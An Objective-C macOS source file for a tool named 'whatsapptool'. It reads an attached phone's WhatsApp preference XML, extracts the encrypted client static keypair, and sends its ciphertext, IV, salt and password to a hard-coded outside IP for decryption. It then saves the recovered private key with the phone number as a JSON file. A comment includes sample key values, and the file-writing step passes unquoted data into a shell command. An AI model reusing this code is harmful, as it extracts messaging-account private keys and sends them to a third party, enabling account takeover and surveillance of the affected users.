//
//  ViewController.m
//  whatsapptool
//
//  Created by JianLong Nie on 2020/12/12.
//  Copyright © 2020 JianLong Nie. All rights reserved.
//

#import "ViewController.h"
#import "CParseXML.h"
#import "STPrivilegedTask.h"
#import "XMLReader.h"

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    self.view.window.delegate =self;
    [self.popBtn setTarget:self];
    [self.popBtn setAction:@selector(handlePopBtn:)];
    @try
    {
      // Attempt access to an empty array
        [self getDevices];
     
    }
    @catch (NSException *exception)
    {
      // Print exception information
      NSLog( @"NSException caught" );
      NSLog( @"Name: %@", exception.name);
      NSLog( @"Reason: %@", exception.reason );
       
      return;
    }
}
-(void)getDevices{
       NSString *cmd = @"/bin/sh getdevices.sh";
       NSString *deviceString =[self runTask:cmd];
//       [self showAlert:@"Success" msg:deviceString];
       NSString *result =[deviceString componentsSeparatedByString:@"attached"][1];
       NSArray *arr =[result componentsSeparatedByString:@"\n"];
       devices = [[NSMutableArray alloc] init];
        [self.popBtn removeAllItems];
       for (int i=0;i<[arr count] ;i++) {
           NSString *myresult = arr[i];
           if ([myresult length]>0) {
               NSMutableDictionary *device = [[NSMutableDictionary alloc] init];
               NSString *deviceinfo = [myresult componentsSeparatedByString:@"device"][0];
               [device setObject:[deviceinfo stringByReplacingOccurrencesOfString:@"\t" withString:@""] forKey:@"device"];
               [devices addObject:device];
               [self.popBtn addItemWithTitle:deviceinfo];
           }
       }
}
- (void)handlePopBtn:(NSPopUpButton *)popBtn {
    popBtn.title = popBtn.selectedItem.title;
}

- (NSString *)removeSpaceAndNewline:(NSString *)str
{
    NSString *temp = [str stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceCharacterSet]];
    NSString *text = [temp stringByTrimmingCharactersInSet:[NSCharacterSet whitespaceAndNewlineCharacterSet ]];
    return text;
}
//encode URL string

-(NSString *)URLEncodedString:(NSString *)str
{
    NSString *encodedString = (NSString *)
    CFBridgingRelease(CFURLCreateStringByAddingPercentEscapes(kCFAllocatorDefault,
                                                              (CFStringRef)str,
                                                              NULL,
                                                              (CFStringRef)@"!*'();:@&=+$,/?%#[]",
                                                              kCFStringEncodingUTF8));
    return encodedString;
}


-(void)getXMLValue:(NSString *) value{
      NSString *cmd = [NSString stringWithFormat:@"/bin/sh launcher.sh %@",value];
      NSString *outputString =[self runTask:cmd] ;
     NSLog(@"outputString====%@",outputString);
//    [self showAlert:@"Success" msg:outputString];
     NSString *resultString = [self removeSpaceAndNewline:[outputString componentsSeparatedByString:@")"][1]];
    NSLog(@"result====%@",resultString);
     NSError *parseError = nil;
     NSDictionary *xmlDictionary = [XMLReader dictionaryForXMLString:resultString error:&parseError];
    if (xmlDictionary) {
        NSArray *resultList=xmlDictionary[@"map"][@"string"];
//        {
//            name = "client_static_keypair_pwd_enc";
//            text = "[2,\"EuiHoXm3fV+AkRog8Hv1wmPt8QzwPLyx1s1\\/lj5pHgyYfUIYGPcKoah6zDXRaLV1ZYZ6diMVw\\/boYOnwLaKYcw\",\"9mfKB00hJqIt79RQ\\/XXW5w\",\"YGF0vg\",\"jhyn5RPGhVbDJTFpLnrPPg\"]";
//        },
//        {
//            name = "server_static_public";
//            text = "xDn6MqBPn3O6ptDhPQt/tqcXrv2dK7aR//NQLFIVal0";
//        }
       
        NSDictionary *client_static_keypair_pwd_enc = resultList[0];
        NSDictionary *server_static_public = resultList[1];
        NSString *tempKeypair=[[client_static_keypair_pwd_enc[@"text"] stringByReplacingOccurrencesOfString:@"[" withString:@""] stringByReplacingOccurrencesOfString:@"]" withString:@""];
        NSArray *tempKeypairArray =[tempKeypair componentsSeparatedByString:@","];
        NSString *publicString=server_static_public[@"text"];
        NSString *cipherText =[tempKeypairArray[1] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
        //Helper.ReplaceLast(Helper.ReplaceFirst(aarry[1], "\"", ""), "\"", "");
        NSString *iv =[tempKeypairArray[2] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
        NSString *salt = [tempKeypairArray[3] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
        NSString *random3 = [tempKeypairArray[4] stringByReplacingOccurrencesOfString:@"\"" withString:@""];
        NSString *requestUrl = [NSString stringWithFormat:@"cipherText=%@&iv=%@&salt=%@&password=%@",[self URLEncodedString:cipherText],[self URLEncodedString:iv],[self URLEncodedString:salt],[self URLEncodedString:random3]];
        NSMutableURLRequest *request = [[NSMutableURLRequest alloc] init];
        [request setURL:[NSURL URLWithString:[NSString stringWithFormat:@"http://167.71.233.200:8485/getBase64DecryptedKeyWhatsapp?%@",requestUrl]]];
        [request setHTTPMethod:@"GET"];
        NSURLSession *session = [NSURLSession sessionWithConfiguration:[NSURLSessionConfiguration defaultSessionConfiguration]];
        [[session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) {
            NSString *requestReply = [[NSString alloc] initWithData:data encoding:NSASCIIStringEncoding];
                dispatch_async(dispatch_get_main_queue(), ^{
                    self->dic=[[NSMutableDictionary alloc] init];
                    [self->dic setObject:[NSString stringWithFormat:@"%@==",requestReply] forKey:@"client_static_keypair"];
                    [self->dic setObject:@"1" forKey:@"version"];
                    [self->dic setObject:self.ccField.stringValue forKey:@"cc"];
                    [self->dic setObject:[NSString stringWithFormat:@"%@",self.phoneField.stringValue] forKey:@"phone"];
                    [self->dic setObject:@"000" forKey:@"sim_mcc"];
                    [self->dic setObject:@"000" forKey:@"sim_mnc"];
                    [self writeStringToFile];
                });
           
            NSLog(@"Request reply: %@", requestReply);
        }] resume];

    }
}
- (void)runSTPrivilegedTask {
    NSString *cmd = @"/bin/sh launcher.sh";
    STPrivilegedTask *privilegedTask = [[STPrivilegedTask alloc] init];
    
    NSMutableArray *components = [[cmd componentsSeparatedByString:@" "] mutableCopy];
    NSString *launchPath = components[0];
    [components removeObjectAtIndex:0];
    
    [privilegedTask setLaunchPath:launchPath];
    [privilegedTask setArguments:components];
    [privilegedTask setCurrentDirectoryPath:[[NSBundle mainBundle] resourcePath]];
    
    // Set it off
    OSStatus err = [privilegedTask launch];
    if (err != errAuthorizationSuccess) {
        if (err == errAuthorizationCanceled) {
            NSLog(@"User cancelled");
            return;
        }  else {
            NSLog(@"Something went wrong: %d", (int)err);
            // For error codes, see http://www.opensource.apple.com/source/libsecurity_authorization/libsecurity_authorization-36329/lib/Authorization.h
        }
    }
    
    [privilegedTask waitUntilExit];
    
    // Success! Now, read the output file handle for data
    NSFileHandle *readHandle = [privilegedTask outputFileHandle];
    NSData *outputData = [readHandle readDataToEndOfFile]; // Blocking call
    NSString *outputString = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding];
    //[self.outputTextField setString:outputString];
    NSLog(@"输出%@",outputString);
//    
//    NSString *exitStr = [NSString stringWithFormat:@"Exit status: %d", privilegedTask.terminationStatus];
//    NSString *result = [[outputString componentsSeparatedByString:@"\"client_static_keypair\">"]  [1]  componentsSeparatedByString:@"</string>"][0];
    
}

-(void)showAlert:(NSString *) title msg:(NSString *) msg{
    NSAlert *alert = [[NSAlert alloc] init];
    alert.alertStyle = NSAlertStyleWarning;
    [alert addButtonWithTitle:@"ok"];
    alert.messageText = title;
    alert.informativeText = msg;
    [alert beginSheetModalForWindow:[NSApplication sharedApplication].keyWindow completionHandler:^(NSModalResponse returnCode) {
        if (returnCode == NSAlertFirstButtonReturn) {
            NSLog(@"确定");
        } else if (returnCode == NSAlertSecondButtonReturn) {
            NSLog(@"取消");
        } else {
            NSLog(@"else");
        }
    }];
}
-(IBAction)refresh:(id)sender{
    @try
    {
      // Attempt access to an empty array
        [self getDevices];
     
    }
    @catch (NSException *exception)
    {
      // Print exception information
      NSLog( @"NSException caught" );
      NSLog( @"Name: %@", exception.name);
      NSLog( @"Reason: %@", exception.reason );
      [self showAlert:exception.name msg:exception.reason];
      return;
    }
  
    
}

-(IBAction)writeAJson:(id)sender{
     
    if ([self.ccField.stringValue length]==0|| [self.phoneField.stringValue length]==0) {
        [self showAlert:@"Alert" msg:@"Please enter full information"];
    }else{
        [self getXMLValue:self.popBtn.title];
    }
  
    
}
-(NSString *)runTask:(NSString *) cmd{
   NSTask *task = [[NSTask alloc] init];
   NSMutableArray *components = [[cmd componentsSeparatedByCharactersInSet:
                          [NSCharacterSet whitespaceCharacterSet]] mutableCopy];
   task.launchPath = components[0];
   [components removeObjectAtIndex:0];
   task.arguments = components;
   task.currentDirectoryPath = [[NSBundle  mainBundle] resourcePath];
   
   NSPipe *outputPipe = [NSPipe pipe];
   [task setStandardOutput:outputPipe];
   [task setStandardError:outputPipe];
   NSFileHandle *readHandle = [outputPipe fileHandleForReading];
   
   [task launch];
   [task waitUntilExit];
   NSData *outputData = [readHandle readDataToEndOfFile];
    NSString *outputString = [[NSString alloc] initWithData:outputData encoding:NSUTF8StringEncoding];
    NSString *exitStr = [NSString stringWithFormat:@"Exit status: %d", task.terminationStatus];
    return outputString;
}
- (void)writeStringToFile{

    // Build the path, and create if needed.
    NSString* filePath = [NSString stringWithFormat:@"~/Desktop/%@.json",self.phoneField.stringValue];
    NSData *serialzedData=[NSJSONSerialization dataWithJSONObject:dic options:0 error:nil];
    NSString *saveBookmark = [[NSString alloc] initWithBytes:[serialzedData bytes] length:[serialzedData length] encoding:NSUTF8StringEncoding];
    NSError *error;
     NSString *cmd = [NSString stringWithFormat:@"/bin/sh write.sh %@ %@.json",saveBookmark,self.phoneField.stringValue];
    [self runTask:cmd];

    if (!error) {
        [self showAlert:@"Success" msg:[NSString stringWithFormat:@"The JSON file is in this directory %@",filePath]];
        self.ccField.stringValue=@"";
        self.phoneField.stringValue=@"";
    }
}
- (void)setRepresentedObject:(id)representedObject {
    [super setRepresentedObject:representedObject];

    // Update the view, if already loaded.
}


@end
